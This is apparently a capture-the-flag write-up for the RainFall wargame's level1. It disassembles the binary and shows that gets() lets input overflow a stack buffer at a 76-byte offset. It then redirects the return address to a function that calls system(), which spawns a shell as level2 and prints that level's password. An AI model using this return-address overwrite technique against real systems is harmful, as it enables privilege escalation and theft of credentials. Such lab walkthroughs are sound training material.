We use objdump to have a overview of the binary level1:

```
level1@RainFall:~$ objdump ./level1 -d
```

```asm
Disassembly of section .plt:

08048330 <gets@plt-0x10>:
 8048330:	ff 35 90 97 04 08    	pushl  0x8049790
 8048336:	ff 25 94 97 04 08    	jmp    *0x8049794
 804833c:	00 00                	add    %al,(%eax)
	...

08048340 <gets@plt>:
 8048340:	ff 25 98 97 04 08    	jmp    *0x8049798
 8048346:	68 00 00 00 00       	push   $0x0
 804834b:	e9 e0 ff ff ff       	jmp    8048330 <_init+0x38>

08048350 <fwrite@plt>:
 8048350:	ff 25 9c 97 04 08    	jmp    *0x804979c
 8048356:	68 08 00 00 00       	push   $0x8
 804835b:	e9 d0 ff ff ff       	jmp    8048330 <_init+0x38>

08048360 <system@plt>:
 8048360:	ff 25 a0 97 04 08    	jmp    *0x80497a0
 8048366:	68 10 00 00 00       	push   $0x10
 804836b:	e9 c0 ff ff ff       	jmp    8048330 <_init+0x38>

08048370 <__gmon_start__@plt>:
 8048370:	ff 25 a4 97 04 08    	jmp    *0x80497a4
 8048376:	68 18 00 00 00       	push   $0x18
 804837b:	e9 b0 ff ff ff       	jmp    8048330 <_init+0x38>

08048380 <__libc_start_main@plt>:
 8048380:	ff 25 a8 97 04 08    	jmp    *0x80497a8
 8048386:	68 20 00 00 00       	push   $0x20
 804838b:	e9 a0 ff ff ff       	jmp    8048330 <_init+0x38>


08048444 <run>:
 8048444:	55                   	push   %ebp
 8048445:	89 e5                	mov    %esp,%ebp
 8048447:	83 ec 18             	sub    $0x18,%esp
 804844a:	a1 c0 97 04 08       	mov    0x80497c0,%eax
 804844f:	89 c2                	mov    %eax,%edx
 8048451:	b8 70 85 04 08       	mov    $0x8048570,%eax
 8048456:	89 54 24 0c          	mov    %edx,0xc(%esp)
 804845a:	c7 44 24 08 13 00 00 	movl   $0x13,0x8(%esp)
 8048461:	00 
 8048462:	c7 44 24 04 01 00 00 	movl   $0x1,0x4(%esp)
 8048469:	00 
 804846a:	89 04 24             	mov    %eax,(%esp)
 804846d:	e8 de fe ff ff       	call   8048350 <fwrite@plt>
 8048472:	c7 04 24 84 85 04 08 	movl   $0x8048584,(%esp)
 8048479:	e8 e2 fe ff ff       	call   8048360 <system@plt>
 804847e:	c9                   	leave  
 804847f:	c3                   	ret    

08048480 <main>:
 8048480:	55                   	push   %ebp
 8048481:	89 e5                	mov    %esp,%ebp
 8048483:	83 e4 f0             	and    $0xfffffff0,%esp
 8048486:	83 ec 50             	sub    $0x50,%esp
 8048489:	8d 44 24 10          	lea    0x10(%esp),%eax
 804848d:	89 04 24             	mov    %eax,(%esp)
 8048490:	e8 ab fe ff ff       	call   8048340 <gets@plt>
 8048495:	c9                   	leave  
 8048496:	c3                   	ret    
 8048497:	90                   	nop
 8048498:	90                   	nop
 8048499:	90                   	nop
 804849a:	90                   	nop
 804849b:	90                   	nop
 804849c:	90                   	nop
 804849d:	90                   	nop
 804849e:	90                   	nop
 804849f:	90                   	nop
 ```

The run function is of interest, there is a gets call in main, gets is vulnerable to buffer overflow attack.
So we will try to modify the return address to access run function that has a system function call.
First we check if level1 is vulnerable to overflowattack:

```
level1@RainFall:~$ checksec --file ./level1 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   ./level1
```

No canary found, so we can exploit with bufferoverflow
First we will fint out the offset of the buffer, then craft a payload:

```
level1@RainFall:~$ python /tmp/exploit.py 
Output:

Error:
Illegal instruction (core dumped)

the overflow happens when the buffer is 76 bytes long
crafting payload...
done:
/tmp/payload_level1
level1@RainFall:~$ cat /tmp/payload_level1 - | ./level1 

Good... Wait what?
id
uid=2030(level1) gid=2030(level1) euid=2021(level2) egid=100(users) groups=2021(level2),100(users),2030(level1)
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

We saw that the limit is 76 bytes, we can also proceed manually by identifying the eip address
and substract the address of the start of the buffer from it. We know from the disassembled code that
0x50 are reserved so the buffer is 0x50 - 0x10 long ie 64 bytes.

```
level1@RainFall:~$ gdb -q ./level1 
Reading symbols from /home/user/level1/level1...(no debugging symbols found)...done.
(gdb) b main
Breakpoint 1 at 0x8048483
(gdb) r
Starting program: /home/user/level1/level1 

Breakpoint 1, 0x08048483 in main ()
(gdb) set disassembly-flavor intel
(gdb) disas main
Dump of assembler code for function main:
   0x08048480 <+0>:	push   ebp
   0x08048481 <+1>:	mov    ebp,esp
=> 0x08048483 <+3>:	and    esp,0xfffffff0
   0x08048486 <+6>:	sub    esp,0x50
   0x08048489 <+9>:	lea    eax,[esp+0x10]
   0x0804848d <+13>:	mov    DWORD PTR [esp],eax
   0x08048490 <+16>:	call   0x8048340 <gets@plt>
   0x08048495 <+21>:	leave  
   0x08048496 <+22>:	ret    
End of assembler dump.
(gdb) b *0x08048495
Breakpoint 2 at 0x8048495
(gdb) c
Continuing.
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 2, 0x08048495 in main ()
(gdb) info frame
Stack level 0, frame at 0xbffff740:
 eip = 0x8048495 in main; saved eip 0xb7e45400
 Arglist at 0xbffff738, args: 
 Locals at 0xbffff738, Previous frame's sp is 0xbffff740
 Saved registers:
  ebp at 0xbffff738, eip at 0xbffff73c
(gdb) x/24wx $esp
0xbffff6e0:	0xbffff6f0	0x0000002f	0xbffff73c	0xb7fd0ff4
0xbffff6f0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff700:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff710:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff720:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff730:	0x41414141	0x41414141	0x41414141	0xb7e45400
(gdb) p/d 0xbffff73c - 0xbffff6f0
$1 = 76
```
